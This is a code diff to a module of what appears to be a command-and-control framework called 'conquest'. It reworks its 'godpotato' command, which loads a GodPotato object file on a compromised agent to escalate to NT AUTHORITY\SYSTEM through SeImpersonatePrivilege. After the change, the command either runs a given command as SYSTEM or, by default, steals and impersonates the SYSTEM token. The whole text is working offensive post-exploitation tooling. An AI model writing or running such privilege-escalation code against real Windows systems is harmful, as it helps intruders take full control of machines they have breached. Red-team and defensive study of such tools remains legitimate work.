@@ -62,15 +62,10 @@ Available options:
 def _godpotato(agentId, cmdline, args):
     cmd = conquest.get_string(args, 0)
     pipe = conquest.get_string(args, 1)
-    token = conquest.get_bool(args, 2)
-
-    if token and cmd:
-        conquest.error(agentId, "The arguments 'token' and 'command' are mutually exclusive.", cmdline)
-        return
 
     bof = conquest.modules_root() + "/privilege-escalation/GodPotato/dist/BOF.x64.o"
     params = conquest.bof_pack("zz", [
-        "token" if token else cmd,      # z: Action
+        cmd if cmd else "token",        # z: Action
         pipe                            # z: Pipe name 
     ])
 
@@ -80,16 +75,15 @@ def _godpotato(agentId, cmdline, args):
         conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
 
 def _godpotatoOutput(agentId, output): 
-    if "[*] Got SYSTEM token" in output: 
+    if "[*] Got SYSTEM token" in output and "[*] Running" not in output: 
         conquest.set_impersonation(agentId, "NT AUTHORITY\\SYSTEM")
     conquest.output(agentId, output)
 
 cmd_godpotato = (
     conquest.createCommand(name="godpotato", description="Escalate privileges to NT AUTHORITY\\SYSTEM via SeImpersonatePrivilege (GodPotato).", example="godpotato cmd /c whoami --pipe my-custom-pipe",
                            message="Tasked agent to elevate privileges via SeImpersonatePrivilege (GodPotato).", mitre=["T1134.001"])
-            .addArgString("command", "Command to execute (default: \"cmd /c whoami\").", False, "", -1)
+            .addArgString("command", "Command to execute. If not set, this command steals the SYSTEM token and impersonates it instead.", False, "", -1)
             .addFlagString("--pipe", "pipe", "Pipe to write output to.")
-            .addFlagBool("--token", "token", "Steal SYSTEM token and apply it to the agent process instead of executing a command.")
             .setHandler(_godpotato)
             .setOutputHandler(_godpotatoOutput)
 ).registerToGroup("privilege escalation")
